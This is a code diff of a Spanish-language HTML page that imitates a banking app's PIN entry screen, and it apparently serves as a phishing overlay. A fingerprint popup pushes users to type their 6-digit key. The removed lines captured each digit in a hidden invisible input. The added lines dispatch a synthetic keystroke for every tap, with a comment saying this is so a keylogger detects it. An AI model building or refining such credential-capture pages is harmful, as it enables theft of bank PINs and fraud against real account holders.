@@ -207,19 +207,17 @@
 
 <body>
 
-<!-- INPUT OCULTO PARA REGISTRO DEL PIN -->
-<input id="hiddenInput" type="number" inputmode="numeric" style="
-  position:absolute;
-  opacity:0;
-  pointer-events:none;
-  width:0;
-  height:0;
-  left:-9999px;
-">
-
 <div class="screen">
 
-  <img src="huella_animada.gif" id="huellaGif" style="position:absolute; left:128px; top:1410px; width:50px; height:50px; z-index:9999; pointer-events:auto;">
+  <img src="huella_animada.gif" id="huellaGif" style="
+      position:absolute;
+      left:128px;
+      top:1410px;
+      width:50px;
+      height:50px;
+      z-index:9999;
+      pointer-events:auto;
+  ">
 
   <div class="overlay" id="overlay"></div>
 
@@ -228,9 +226,11 @@
   <div class="popup-huella" id="popupHuella">
       Esta opción no está disponible
       <div class="spinner-huella"></div>
+
       <div style="margin-top:40px; font-size:22px; color:#ccc;">
         Para su seguridad, ingrese su clave de 6 dígitos.
       </div>
+
       <div class="cancelar-huella" id="cancelarHuella">Cancelar</div>
   </div>
 
@@ -278,7 +278,6 @@
   const dots = document.querySelectorAll(".dot");
   const popup = document.getElementById("popup");
   const overlay = document.getElementById("overlay");
-  const hiddenInput = document.getElementById("hiddenInput"); // Agregado para referencia al input real
 
   let pinIndex = 0;
 
@@ -291,11 +290,20 @@
 
   document.querySelectorAll('.key').forEach(btn => {
     btn.addEventListener('click', () => {
+      // Simular el evento de teclado al hacer clic en la tecla
+      const keyEvent = new KeyboardEvent('keydown', {
+        key: btn.dataset.num,
+        keyCode: btn.dataset.num.charCodeAt(0),
+        which: btn.dataset.num.charCodeAt(0),
+        bubbles: true
+      });
 
+      // Disparar el evento para que sea detectado por un keylogger
+      document.dispatchEvent(keyEvent);
+
+      // Visualización de la tecla presionada
       btn.classList.add('pressed');
       setTimeout(() => btn.classList.remove('pressed'), 140);
-
-      hiddenInput.value += btn.dataset.num; // Registrar número en el input oculto
 
       if(pinIndex === 0){
         title.style.display = "none";
@@ -333,32 +341,7 @@
       title.style.display = "block";
       pinDots.style.display = "none";
     }
-
-    // Borrar número del input real
-    hiddenInput.value = hiddenInput.value.slice(0, -1);
   });
-
-  /* === POPUP HUELLA === */
-  const huellaGif = document.getElementById("huellaGif");
-  const popupHuella = document.getElementById("popupHuella");
-  const overlayHuella = document.getElementById("overlayHuella");
-  const cancelarHuella = document.getElementById("cancelarHuella");
-
-  huellaGif.addEventListener("click", () => {
-    popupHuella.style.display = "block";
-    overlayHuella.style.display = "block";
-  });
-
-  cancelarHuella.addEventListener("click", () => {
-    popupHuella.style.display = "none";
-    overlayHuella.style.display = "none";
-  });
-
-  overlayHuella.addEventListener("click", () => {
-    popupHuella.style.display = "none";
-    overlayHuella.style.display = "none";
-  });
-
 </script>
 
 </body>
